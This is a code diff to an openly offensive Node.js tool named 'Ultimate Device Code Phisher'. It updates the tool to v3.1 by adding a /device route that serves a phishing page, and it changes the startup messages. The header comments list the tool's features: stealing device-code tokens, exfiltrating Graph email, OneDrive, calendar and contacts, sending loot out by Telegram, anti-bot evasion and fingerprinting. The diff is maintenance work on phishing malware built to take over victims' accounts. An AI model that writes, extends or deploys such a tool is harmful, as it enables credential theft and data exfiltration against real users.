@@ -1,5 +1,5 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v3.0 – All Features
+// 🥔 ULTIMATE DEVICE CODE PHISHER v3.1 – With /device route
 // ============================================================
 // Includes: Device Code, Auto-Refresh, Multi-Tenant, PRT,
 // Dashboard, Graph Email/OneDrive/Calendar/Contacts Exfil,
@@ -7,7 +7,7 @@
 // Multi-Service, Session Replay with Cookies, WebSocket,
 // Health Check, Multi-Channel Exfil, Anti-Bot, Custom Redirect,
 // QR Code, Fingerprinting, Token Export ZIP, Manual Exchange,
-// Polling Fallback, Session Cleanup.
+// Polling Fallback, Session Cleanup, and now /device route.
 // ============================================================
 
 const http = require('http');
@@ -306,6 +306,11 @@ app.use((req, res, next) => {
         return res.status(403).send('Forbidden');
     }
     next();
+});
+
+// ── Serve custom device page from /device (NEW ROUTE) ──
+app.get('/device', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'device_code.html'));
 });
 
 // ── Device Code Flow ──
@@ -636,8 +641,8 @@ server.on('upgrade', (req, socket, head) => {
 });
 
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v3.0 running on port ${PORT}`);
-    console.log(`📱 Device page: http://localhost:${PORT}/device_code.html`);
+    console.log(`✅ Ultimate Device Phisher v3.1 running on port ${PORT}`);
+    console.log(`📱 Device page: http://localhost:${PORT}/device  (serves device_code.html)`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
     console.log(`🚀 All features loaded.`);
